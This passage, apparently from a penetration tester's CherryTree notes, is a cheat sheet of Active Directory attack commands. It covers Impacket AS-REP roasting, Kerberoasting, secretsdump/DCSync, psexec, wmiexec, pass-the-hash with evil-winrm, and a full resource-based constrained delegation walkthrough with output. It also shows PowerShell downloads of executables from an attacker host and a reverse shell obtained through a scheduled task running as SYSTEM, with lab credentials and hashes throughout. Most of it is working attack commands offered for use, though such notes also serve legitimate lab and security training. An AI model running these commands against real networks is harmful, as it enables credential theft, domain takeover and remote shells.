            <codebox char_offset="285" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">john admin.txt --wordlist=/usr/share/wordlists/rockyou.txt</codebox>
            <codebox char_offset="351" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-psexec /&lt;user&gt;:&lt;Password&gt;@10.10.10.169</codebox>
            <codebox char_offset="357" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-psexec /Administrator:Ticketmaster1968@10.10.10.169</codebox>
          </node>
        </node>
        <node name="Impacket" unique_id="83" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690727" ts_lastsave="1710795310">
          <node name="GetNPUsers-ASRreproasting" unique_id="84" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690728" ts_lastsave="1711227984">
            <rich_text scale="h1">Request AS_REP message</rich_text>
            <rich_text>

</rich_text>
            <rich_text scale="h3">Using Impacket</rich_text>
            <rich_text>


</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>
</rich_text>
            <codebox char_offset="41" justification="left" frame_width="1810" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">###Try all the usernames in usernames.txt
impacket-GetNPUsers jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast

### Use domain creds to extract targets and target them
impacket-GetNPUsers jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast


### Get  ASREPMessage without pass  
impacket-GetNPUsers spookysec.local/svc-admin -no-pass


or

python3 /opt/impacket/examples/GetNPUsers.py domain.local/admin -request -no-pass -dc-ip 10.10.10.169
</codebox>
          </node>
          <node name="secretdumps-GetAllHashes" unique_id="85" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690728" ts_lastsave="1689887987">
            <rich_text>
</rich_text>
            <rich_text foreground="#569cd6" weight="heavy">### Dump All password hashes from a user account</rich_text>
            <rich_text> (DC Sync aka synchronizing DC)


</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>

___________________________________________________________

</rich_text>
            <rich_text scale="h2">Getting All the hashes via ntds.dit files</rich_text>
            <rich_text>

</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>

ex:


</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>

</rich_text>
            <codebox char_offset="83" justification="left" frame_width="850" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-secretsdump -just-dc backup@spookysec.local
or 
impacket-secretsdump domain.local/user@10.10.10.169</codebox>
            <codebox char_offset="190" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-secretsdump -ntds &lt;ntds.dit&gt; -system &lt;SYSTEM&gt; LOCAL</codebox>
            <codebox char_offset="199" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-secretsdump -ntds temp/ntds.dit -system temp/SYSTEM LOCAL</codebox>
          </node>
          <node name="psexec - Passthe HAsh" unique_id="86" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690728" ts_lastsave="1687690770">
            <rich_text>Exploitation via pass the hash



</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>
or


</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>

</rich_text>
            <rich_text foreground="#d4d4d4">or</rich_text>
            <rich_text>


</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>


</rich_text>
            <codebox char_offset="34" justification="left" frame_width="1314" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-psexec  domain.local/admin@10.10.10.169 -hashes randomLMHASH:oeasdNTLMHASH
</codebox>
            <codebox char_offset="41" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">sudo python2 psexec.py /administrator:Password123@10.10.10.169 </codebox>
            <codebox char_offset="49" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-psexec /administrator:Password123@10.10.10.169</codebox>
          </node>
          <node name="GetADUsers-enumerating Data from users" unique_id="87" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690728" ts_lastsave="1687690774">
            <rich_text>
</rich_text>
            <rich_text foreground="#79c0ff" weight="heavy">### This script will gather data about the domain's users and their corresponding email addresses.</rich_text>
            <rich_text>
</rich_text>
            <rich_text foreground="#c9d1d9">```</rich_text>
            <rich_text>
</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>
</rich_text>
            <rich_text foreground="#c9d1d9">```</rich_text>
            <rich_text>
or

</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>
</rich_text>
            <codebox char_offset="104" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">GetADUsers.py domain/user:password@IP
or
impacket-GetADUsers domain/user:password@IP</codebox>
            <codebox char_offset="114" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-GETADUsers -all domain.local/user -dc-ip 10.10.10.169</codebox>
          </node>
          <node name="GetUserSPNs - get TGTs" unique_id="88" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690728" ts_lastsave="1707857540">
            <rich_text>
</rich_text>
            <rich_text scale="h3">Get TGT for kerberoastable users</rich_text>
            <rich_text>


</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>

or u can run it without password

</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>


or

if you get the following error:
</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>

u need to use dc-host instead of dc-ip with the host name of the domain controller (added in /etc/hosts) 


</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>


once done we can crack it using john

</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>


once we get the password we should use psexec to get a shell

</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>
Ex:
</rich_text>
            <rich_text justification="left"></rich_text>
            <codebox char_offset="36" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Impacket-GetUserSPN -request -dc-ip 10.10.10.169 domain.local/user </codebox>
            <codebox char_offset="73" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Impacket-GetUserSPN -request -dc-ip 10.10.10.169 domain.local/user --no-pass</codebox>
            <codebox char_offset="113" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Getting machine hostname
[-] The SMB request is not supported. Probably NTLM is disabled. Try to specify corresponding NetBIOS name or FQDN as the value of the -dc-host option</codebox>
            <codebox char_offset="224" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-GetUserSPNs -request -dc-host dc1.scrm.local scrm.local/ksimpson:ksimpson -outputfile hashes.kerberoast -k</codebox>
            <codebox char_offset="266" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">john hashes.kerberoast --wordlist=/usr/share/wordlists/rockyou.txt</codebox>
            <codebox char_offset="332" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-psexec /&lt;user&gt;:&lt;Password&gt;@10.10.10.169</codebox>
            <codebox char_offset="338" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-psexec /Administrator:Ticketmaster1968@10.10.10.169</codebox>
          </node>
          <node name="impacket-addcomputer" unique_id="96" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1690042606" ts_lastsave="1690043170">
            <rich_text>
</rich_text>
            <rich_text scale="h3">Resource Based Constrained Delegation</rich_text>
            <rich_text>
&#13;Let's use our access with the </rich_text>
            <rich_text family="monospace">l.livingstone</rich_text>
            <rich_text> account to create a new machine account on the domain. We can do with by using </rich_text>
            <rich_text family="monospace">impacket-addcomputer</rich_text>
            <rich_text>.
&#13;</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text family="monospace">&#13;
</rich_text>
            <rich_text>&#13;We can verify that this machine account was added to the domain by using our </rich_text>
            <rich_text family="monospace">evil-winrm</rich_text>
            <rich_text> session from before.
</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>



With this account added, we now need a python script to help us manage the delegation rights. Let's grab a copy of </rich_text>
            <rich_text link="webs https://raw.githubusercontent.com/tothi/rbcd-attack/master/rbcd.py">rbcd.py</rich_text>
            <rich_text> and use it to set </rich_text>
            <rich_text family="monospace">msDS-AllowedToActOnBehalfOfOtherIdentity</rich_text>
            <rich_text> on our new machine account.
</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text family="monospace">&#13;
</rich_text>
            <rich_text>&#13;We can confirm that this was successful by using our </rich_text>
            <rich_text family="monospace">evil-winrm</rich_text>
            <rich_text> session.
</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text family="monospace">&#13;
</rich_text>
            <codebox char_offset="186" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">┌──(kali㉿kali)-[~]&#13;
└─$ impacket-addcomputer resourced.local/l.livingstone -dc-ip 10.10.10.169 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'ATTACK$' -computer-pass 'AttackerPC1!'&#13;
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation&#13;
&#13;
[*] Successfully added machine account ATTACK$ with password AttackerPC1!.</codebox>
            <codebox char_offset="299" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">&#13;*Evil-WinRM* PS C:\Users\L.Livingstone\Documents&gt; get-adcomputer attack&#13;
&#13;
&#13;
DistinguishedName : CN=ATTACK,CN=Computers,DC=resourced,DC=local&#13;
DNSHostName       :&#13;
Enabled           : True&#13;
Name              : ATTACK&#13;
ObjectClass       : computer&#13;
ObjectGUID        : 3fe60405-3692-4de9-8a20-917b234741b9&#13;
SamAccountName    : ATTACK$&#13;
SID               : S-1-5-21-537427935-490066102-1511301751-3601&#13;
UserPrincipalName :</codebox>
            <codebox char_offset="514" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">&#13;┌──(kali㉿kali)-[~]&#13;
└─$ wget https://raw.githubusercontent.com/tothi/rbcd-attack/master/rbcd.py  &#13;
...&#13;
┌──(kali㉿kali)-[~]&#13;
└─$ sudo python3 rbcd.py -dc-ip 192.168.120.181 -t RESOURCEDC -f 'ATTACK' -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced\\l.livingstone                                  &#13;
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation&#13;
&#13;
[*] Starting Resource Based Constrained Delegation Attack against RESOURCEDC$&#13;
[*] Initializing LDAP connection to 192.168.120.181&#13;
[*] Using resourced\l.livingstone account with password ***&#13;
[*] LDAP bind OK&#13;
[*] Initializing domainDumper()&#13;
[*] Initializing LDAPAttack()&#13;
[*] Writing SECURITY_DESCRIPTOR related to (fake) computer `ATTACK` into msDS-AllowedToActOnBehalfOfOtherIdentity of target computer `RESOURCEDC`&#13;
[*] Delegation rights modified succesfully!&#13;
[*] ATTACK$ can now impersonate users on RESOURCEDC$ via S4U2Proxy</codebox>
            <codebox char_offset="591" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">&#13;*Evil-WinRM* PS C:\Users\L.Livingstone\Documents&gt; Get-adcomputer resourcedc -properties msds-allowedtoactonbehalfofotheridentity |select -expand msds-allowedtoactonbehalfofotheridentity&#13;
&#13;
Path Owner                  Access&#13;
---- -----                  ------&#13;
     BUILTIN\Administrators resourced\ATTACK$ Allow</codebox>
          </node>
          <node name="impacket-getST" unique_id="97" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1690043804" ts_lastsave="1690043838">
            <rich_text>We now need to get the administrator service ticket. We can do this by using </rich_text>
            <rich_text family="monospace">impacket-getST</rich_text>
            <rich_text> with our privileged machine account.
&#13;</rich_text>
            <rich_text justification="left"></rich_text>
            <codebox char_offset="130" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">┌──(kali㉿kali)-[~]&#13;
└─$ impacket-getST -spn cifs/resourcedc.resourced.local resourced/attack\$:'AttackerPC1!' -impersonate Administrator -dc-ip 10.10.10.169&#13;

Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation&#13;
&#13;
[*] Getting TGT for user&#13;
[*] Impersonating Administrator&#13;
[*]     Requesting S4U2self&#13;
[*]     Requesting S4U2Proxy&#13;
[*] Saving ticket in Administrator.ccache&#13;
</codebox>
          </node>
          <node name="wmiexec- shell" unique_id="110" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1710795310" ts_lastsave="1710795419">
            <rich_text>

(I usually use it when evilwinrm and psexec dont work)
if u have the credentials u can access a windows machine via:

</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text>

Ex:
</rich_text>
            <rich_text justification="left"></rich_text>
            <codebox char_offset="120" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-wmiexec &lt;domain&gt;/&lt;username&gt;:'&lt;password&gt;'@10.10.10.169</codebox>
            <codebox char_offset="127" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-wmiexec search/tristan.davies:'Password1234!'@10.10.10.169
</codebox>
          </node>
        </node>
        <node name="Pass The Hash Attack" unique_id="39" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687689619" ts_lastsave="1688335472">
          <rich_text>


</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
or


</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

with mimikatz
</rich_text>
          <rich_text link="webs https://blog.netwrix.com/2021/11/30/passing-the-hash-with-mimikatz/">https://blog.netwrix.com/2021/11/30/passing-the-hash-with-mimikatz/</rich_text>
          <rich_text>

</rich_text>
          <codebox char_offset="3" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">evil-winrm -i 10.10.10.169 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc</codebox>
          <codebox char_offset="10" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">impacket-psexec  domain.local/admin@10.10.10.169 -hashes randomLMHASH:oeasdNTLMHASH</codebox>
        </node>
        <node name="Useful Powershell/CMD Commands" unique_id="40" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687689661" ts_lastsave="1696728088">
          <rich_text>
</rich_text>
          <rich_text scale="h2">
Setting password for user sophie</rich_text>
          <rich_text>


</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


_______________________________________________________

&#13;• </rich_text>
          <rich_text family="monospace">Account Operators</rich_text>
          <rich_text> Group: According to official </rich_text>
          <rich_text link="webs https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#bkmk-accountoperators">documentation</rich_text>
          <rich_text>, members of the </rich_text>
          <rich_text family="monospace">Account Operators</rich_text>
          <rich_text> group are allowed create and modify users and add them to non-protected groups ( non admin )
&#13;• </rich_text>
          <rich_text family="monospace">WriteDACL</rich_text>
          <rich_text> : The WriteDACL privilege gives a user the ability to add ACLs to an&#13;object. This means that we can add a user to this group and give them </rich_text>
          <rich_text link="webs https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync">DCSync</rich_text>
          <rich_text> privileges that can be used to abuse and grab credential and then shell via psexec
&#13;



__________________________________________________



</rich_text>
          <rich_text scale="h3">Adding a User </rich_text>
          <rich_text>

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
or

</rich_text>
          <rich_text scale="h3">Adding user to Admin  local group</rich_text>
          <rich_text>

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

Or adding them to any other group

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
 or with

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


Then accessing the machine
_________________________________________________________
</rich_text>
          <rich_text scale="h2">curl replacement in Powershell:</rich_text>
          <rich_text>
To downoad files:

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

pr
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
or

</rich_text>
          <rich_text family="monospace">$WebClient = New-Object System.Net.WebClient&#13;
$WebClient.DownloadFile("</rich_text>
          <rich_text family="monospace" foreground="#5ebdab">http://10.10.10.169</rich_text>
          <rich_text family="monospace">/navigating-code.exe","C:\navigating-code.exe")&#13;
</rich_text>
          <rich_text>&#13;    
or
&#13;</rich_text>
          <rich_text family="monospace">powershell.exe (New-Object System.Net.WebClient).DownloadFile('</rich_text>
          <rich_text family="monospace" foreground="#5ebdab">http://10.10.10.169</rich_text>
          <rich_text family="monospace">:8080/file.bat','filename.bat')&#13;
</rich_text>
          <rich_text>&#13;    



______________________________


</rich_text>
          <rich_text scale="h2">Force any particular computer to sync its GPOs imm</rich_text>
          <rich_text justification="left" scale="h2"></rich_text>
          <rich_text scale="h2">ediate</rich_text>
          <rich_text>




________________________________


</rich_text>
          <rich_text scale="h2">Use powershell specifically for all the below commands:
</rich_text>
          <rich_text>
</rich_text>
          <rich_text scale="h3">Testing Connection</rich_text>
          <rich_text justification="left" scale="h3"></rich_text>
          <rich_text scale="h3">/Access</rich_text>
          <rich_text>


____________________________________
</rich_text>
          <rich_text scale="h2">CMD</rich_text>
          <rich_text>


</rich_text>
          <rich_text scale="h3">Running as a different user on</rich_text>
          <rich_text justification="left" scale="h3"></rich_text>
          <rich_text scale="h3"> an AD</rich_text>
          <rich_text>




_____________________________________________


</rich_text>
          <rich_text scale="h2">Powershell Remoting</rich_text>
          <rich_text>

allows you to get a Powershell session in the remote machine, listens on 5985 and is enabled by default in the Windows Server machines.
 You can use Powershell Remoting from Windows by using many </rich_text>
          <rich_text link="webs https://docs.microsoft.com/en-us/powershell/scripting/learn/ps101/08-powershell-remoting?view=powershell-7.1">CmdLets and parameters</rich_text>
          <rich_text> available in Powershell. From a Linux machine you can use </rich_text>
          <rich_text link="webs https://github.com/Hackplayers/evil-winrm">evil-winrm</rich_text>
          <rich_text>.
 As well as in the RPC/SMB case, you can use a password, a NT hash or a Kerberos ticket to connect to the target machine. With evil-winrm, 
 you can pass them to the application as a parameters or configure the ccache file as in impacket. 
 In case of the Powershell cmdlets, you can use a password directly, but if you have a Kerberos ticket or a NT hash, you will need to inject them by using </rich_text>
          <rich_text link="webs https://github.com/GhostPack/Rubeus">Rubeus</rich_text>
          <rich_text> or </rich_text>
          <rich_text link="webs https://github.com/gentilkiwi/mimikatz">mimikatz</rich_text>
          <rich_text>.
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text> 
 Ex:
 
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text> 
 or
 
 
 
where ptt is pass the ticket
 
 </rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>then
 
 
 
 
 </rich_text>
          <rich_text link="webs https://blog.netwrix.com/2021/11/30/passing-the-hash-with-mimikatz/">https://blog.netwrix.com/2021/11/30/passing-the-hash-with-mimikatz/</rich_text>
          <rich_text>
 
 </rich_text>
          <rich_text family="monospace">
</rich_text>
          <rich_text>
</rich_text>
          <codebox char_offset="37" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Set-ADAccountPassword sophie -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password') -Verbose</codebox>
          <codebox char_offset="606" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">net user john1 pass123 /add /domain</codebox>
          <codebox char_offset="647" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">net localgroup administrators john1 /add</codebox>
          <codebox char_offset="685" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">net group "EXCHANGE WINDOWS PERMISSIONS" john1 /add</codebox>
          <codebox char_offset="697" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">net group "Exchange Windows Permissions" john1 /add /domain</codebox>
          <codebox char_offset="837" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Invoke-WebRequest http://10.10.10.169/GMSAPasswordReader.exe -OutFile GMSA.exe</codebox>
          <codebox char_offset="843" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">
$wc = New-Object Net.WebClient
$wc.DownloadString("http://10.10.10.169  whatever else u want with space")
</codebox>
          <codebox char_offset="1205" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">gpupdate /force</codebox>
          <codebox char_offset="1327" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="0">Test-NetConnection -ComputerName YouComputerName -Port 389
or

# Test if HTTP port is open
Test-NetConnection google.com -CommonTCPPort "Http"

# Or define a port number
Test-NetConnection google.com -Port 80</codebox>
          <codebox char_offset="1411" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="dosbatch" highlight_brackets="1" show_line_numbers="0">runas /user:corp\server_admin "C:\Windows\system32\notepad.exe C:\ps\region.txt"

or  like ippsec writeup

runas /netonly /user:domain.local\user cmd
</codebox>
          <codebox char_offset="2196" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">.\Rubeus.exe asktgt /user:Administrator /rc4:b73fdfe10e87b4ca5c0d957f81de6863 /ptt</codebox>
          <codebox char_offset="2206" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">mimikatz # kerberos::ptt</codebox>
          <codebox char_offset="2251" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Enter-PSSession -ComputerName dc01</codebox>
          <node name="Getting a Shell from password" unique_id="92" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1688943845" ts_lastsave="1688943934">
            <rich_text scale="h2">First, let's restart out Netcat listener.</rich_text>
            <rich_text>
</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text scale="h2">
&#13;Next, we'll spawn a new PowerShell session to install and run our scheduled task using the Administrator user's credentials.</rich_text>
            <rich_text>

&#13;</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text family="monospace">&#13;
</rich_text>
            <rich_text>
</rich_text>
            <rich_text scale="h2">&#13;Once we run the scheduled task (as shown in the final command above), we are presented with a full system shell.</rich_text>
            <rich_text>
</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text family="monospace">&#13;
</rich_text>
            <codebox char_offset="42" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">&#13;kali@kali:~$ sudo nc -lvp 445&#13;
listening on [any] 445 ...&#13;
</codebox>
            <codebox char_offset="172" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">c:\windows\system32\inetsrv&gt;powershell&#13;
powershell&#13;
Windows PowerShell &#13;
Copyright (C) Microsoft Corporation. All rights reserved.&#13;
&#13;
PS C:\windows\system32\inetsrv&gt; $pw = ConvertTo-SecureString "T4E@d8!/od@l36" -AsPlainText -Force&#13;
$pw = ConvertTo-SecureString "T4E@d8!/od@l36" -AsPlainText -Force&#13;
PS C:\windows\system32\inetsrv&gt;&#13;
&#13;
PS C:\windows\system32\inetsrv&gt; $creds = New-Object System.Management.Automation.PSCredential ("Administrator", $pw)&#13;
$creds = New-Object System.Management.Automation.PSCredential ("Administrator", $pw)&#13;
PS C:\windows\system32\inetsrv&gt;&#13;
&#13;
PS C:\windows\system32\inetsrv&gt; Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /create /sc onstart /tn shell /tr C:\inetpub\wwwroot\shell.exe /ru SYSTEM } -Credential $creds&#13;
Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /create /sc onstart /tn shell /tr C:\inetpub\wwwroot\shell.exe /ru SYSTEM } -Credential $creds&#13;
SUCCESS: The scheduled task "shell" has successfully been created.&#13;
PS C:\windows\system32\inetsrv&gt;&#13;
&#13;
PS C:\windows\system32\inetsrv&gt; Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /run /tn shell } -Credential $creds&#13;
Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /run /tn shell } -Credential $creds&#13;
SUCCESS: Attempted to run the scheduled task "shell".&#13;
PS C:\windows\system32\inetsrv&gt;</codebox>
            <codebox char_offset="290" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">&#13;kali@kali:~$ nc -lvp 445&#13;
listening on [any] 445 ...&#13;
192.168.120.108: inverse host lookup failed: Unknown host&#13;
connect to [192.168.118.6] from (UNKNOWN) [192.168.120.108] 49731&#13;
Microsoft Windows [Version 10.0.17763.1554]&#13;
(c) 2018 Microsoft Corporation. All rights reserved.&#13;
&#13;
C:\Windows\system32&gt;whoami&#13;
whoami&#13;
nt authority\system</codebox>
          </node>
        </node>
        <node name="CrackMapExec" unique_id="41" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687689718" ts_lastsave="1689888826">
          <rich_text scale="h3">Enumerating smb via crackmapexec</rich_text>
          <rich_text>

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


</rich_text>
          <rich_text scale="h3">Enumerating all the shares with a given password</rich_text>
          <rich_text>

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

 
</rich_text>
          <rich_text scale="h4"> Checking Pass the Hash</rich_text>
          <rich_text>
 
 </rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
 
</rich_text>
          <rich_text scale="h3"> Listing all the shares</rich_text>
          <rich_text>
 
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
</rich_text>
          <rich_text scale="h3">Null Authentication smb Enumeration</rich_text>
          <rich_text>

 </rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
 


</rich_text>
          <rich_text scale="h3">Anonymous Authentication smb Enum</rich_text>
          <rich_text>
 </rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
 
 
</rich_text>
          <rich_text scale="h3">  </rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
</rich_text>
          <rich_text scale="h2">Checking if winrm works</rich_text>
          <rich_text>


</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

once confirmed simply run:
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
  
  
</rich_text>
          <rich_text scale="h2"> Adding Domain with -d</rich_text>
          <rich_text>
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text> 
</rich_text>
          <rich_text scale="h3"> Checking all the files in the share</rich_text>
          <rich_text>
 
 </rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
 
</rich_text>
          <rich_text scale="h3"> checking usernames and passwords line by line (not using all the passwords for each user)</rich_text>
          <rich_text>
 
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


or chacking all the password and continuing on success:

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

____________________________________________________________________-


Grabbing the Laps password

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

______________________________


</rich_text>
          <rich_text scale="h2">SSH Brute Force</rich_text>
          <rich_text>

</rich_text>
          <rich_text justification="left"></rich_text>
